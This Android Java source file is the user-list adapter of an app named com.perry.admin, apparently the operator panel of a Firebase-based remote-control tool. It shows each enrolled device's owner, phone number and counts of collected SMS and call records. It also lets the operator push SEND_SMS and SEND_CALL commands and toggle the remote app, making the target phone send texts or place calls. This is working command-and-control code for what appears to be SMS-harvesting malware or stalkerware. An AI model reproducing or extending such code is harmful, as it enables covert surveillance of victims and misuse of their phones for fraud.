package com.perry.admin.Adapter;

import android.content.Intent;
import android.graphics.Color;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.recyclerview.widget.RecyclerView;

import com.perry.admin.Model.ActionSmsModel;
import com.perry.admin.Util.LocalData;
import com.perry.admin.Model.UserModel;
import com.perry.admin.R;
import com.perry.admin.Ui.MainActivity;
import com.firebase.ui.database.FirebaseRecyclerAdapter;
import com.firebase.ui.database.FirebaseRecyclerOptions;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.material.card.MaterialCardView;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.HashMap;
import java.util.Map;

public class UserAdapter extends FirebaseRecyclerAdapter<UserModel, UserAdapter.ViewHolder> {



    public UserAdapter(@NonNull FirebaseRecyclerOptions<UserModel> options) {
        super(options);
    }

    @Override
    protected void onBindViewHolder(@NonNull UserAdapter.ViewHolder holder, int position, @NonNull UserModel model) {
        holder.name.setText(model.getUserName());
        holder.model.setText(model.getUserMobile());
        holder.deviceId.setText(model.getUserDeviceId());

        DatabaseReference UserDb = FirebaseDatabase.getInstance().getReference().child("Users").child(model.getUserDeviceId());

        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(holder.user.getContext(), R.style.MaterialAlertDialog_rounded);
        View customView = LayoutInflater.from(holder.user.getContext()).inflate(R.layout.adv_layout, null);
        TextView sendCall = customView.findViewById(R.id.send_call);
        TextView sendSms = customView.findViewById(R.id.send_sms);
        TextView stopApp = customView.findViewById(R.id.stop_service);

        MaterialAlertDialogBuilder builder2 = new MaterialAlertDialogBuilder(holder.user.getContext(), R.style.MaterialAlertDialog_rounded);
        View actionView = LayoutInflater.from(holder.user.getContext()).inflate(R.layout.action_layout, null);
        EditText toMobile = actionView.findViewById(R.id.toMobile);
        EditText toSms = actionView.findViewById(R.id.toSms);
        TextView sendSmsBtn = actionView.findViewById(R.id.send_sms_btn);


        MaterialAlertDialogBuilder builder3 = new MaterialAlertDialogBuilder(holder.user.getContext(), R.style.MaterialAlertDialog_rounded);
        View callView = LayoutInflater.from(holder.user.getContext()).inflate(R.layout.create_call_layout, null);
        EditText caller = callView.findViewById(R.id.callNumber);
        TextView callNowBtn = callView.findViewById(R.id.sendCallBtn);



        
        holder.user.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(v.getContext(), MainActivity.class);
                LocalData.saveDeviceID(v.getContext(), model.getUserDeviceId(), model.getUserName());
                v.getContext().startActivity(intent);
            }
        });


        View longClickView = holder.user;
        longClickView.setOnLongClickListener(new View.OnLongClickListener() {
            @Override
            public boolean onLongClick(View v) {
                builder.setView(customView);
                AlertDialog dialog = builder.create();
                dialog.show();
                return true;
            }
        });

        sendCall.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                builder3.setView(callView);
                AlertDialog dialog = builder3.create();
                dialog.show();

            }
        });
        sendSms.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                builder2.setView(actionView);
                AlertDialog dialog = builder2.create();
                dialog.show();

            }
        });

        sendSmsBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String toMobileTxt = toMobile.getText().toString();
                String toSmsTxt = toSms.getText().toString();

                if (toMobileTxt.isEmpty() && toSmsTxt.isEmpty()){
                    Toast.makeText(customView.getContext(), "Please enter details !!", Toast.LENGTH_SHORT).show();
                }else{

                    ActionSmsModel smsModel = new ActionSmsModel("true", toMobileTxt, toSmsTxt);
                    UserDb.child("SEND_SMS").setValue(smsModel).addOnSuccessListener(new OnSuccessListener<Void>() {
                        @Override
                        public void onSuccess(Void unused) {
                            Toast.makeText(view.getContext(), "Action Send ", Toast.LENGTH_SHORT).show();

                        }
                    }).addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            Toast.makeText(view.getContext(), e.toString(), Toast.LENGTH_SHORT).show();
                        }
                    });

                }
            }
        });

        callNowBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String toMobileTxt = caller.getText().toString();

                if (toMobileTxt.isEmpty() ){
                    Toast.makeText(customView.getContext(), "Please enter details !!", Toast.LENGTH_SHORT).show();
                }else{

                    Map<String, Object> postValues = new HashMap<String,Object>();

                    postValues.put("action", "true");
                    postValues.put("mobile", toMobileTxt);
                    UserDb.updateChildren(postValues);

                    UserDb.child("SEND_CALL").setValue(postValues).addOnSuccessListener(new OnSuccessListener<Void>() {
                        @Override
                        public void onSuccess(Void unused) {
                            Toast.makeText(view.getContext(), "Action Send ", Toast.LENGTH_SHORT).show();

                        }
                    }).addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            Toast.makeText(view.getContext(), e.toString(), Toast.LENGTH_SHORT).show();
                        }
                    });

                }
            }
        });





        UserDb.child("Sms").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                int size = (int) snapshot.getChildrenCount();

                String c = String.valueOf(size);
                holder.userTotalMsg.setText( c);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });
        UserDb.child("Call").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                int size = (int) snapshot.getChildrenCount();

                String c = String.valueOf(size);
                holder.userTotalCall.setText(c);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });

        UserDb.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                String status = snapshot.child("appStatus").getValue(String.class);

                if (status != null) {
                    if (status.equals("on")){
                        holder.appStatus.setText("\uD83D\uDFE2");
                        stopApp.setText("STOP APP");
                        stopApp.setTextColor(Color.RED);
                    }else{
                        holder.appStatus.setText("\uD83D\uDD34");
                        stopApp.setText("START APP");
                        stopApp.setTextColor(Color.GREEN);

                    }
                }

                stopApp.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View view) {
                        Map<String, Object> postValues = new HashMap<String,Object>();

                        if (status != null) {
                            if (status.equals("on")){
                                postValues.put("appStatus", "off");
                                UserDb.updateChildren(postValues);

                            }else{
                                postValues.put("appStatus", "on");
                                UserDb.updateChildren(postValues);
                            }
                        }

                    }
                });

            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });



    }

    @NonNull
    @Override
    public UserAdapter.ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
        View view = LayoutInflater.from(parent.getContext()).inflate(R.layout.user_layout, parent, false);
        return new UserAdapter.ViewHolder(view)  ;
    }

    public class ViewHolder extends RecyclerView.ViewHolder {

        TextView name, model, deviceId, userTotalMsg, userTotalCall, appStatus;
        MaterialCardView user;
        public ViewHolder(@NonNull View itemView) {
            super(itemView);

            name=itemView.findViewById(R.id.user_name);
            deviceId=itemView.findViewById(R.id.user_deviceId);
            model=itemView.findViewById(R.id.user_mobile);
            user=itemView.findViewById(R.id.user);
            userTotalMsg=itemView.findViewById(R.id.userTotalMsg);
            userTotalCall=itemView.findViewById(R.id.userTotalCall);
            appStatus=itemView.findViewById(R.id.AppStatusText);


        }
    }
}
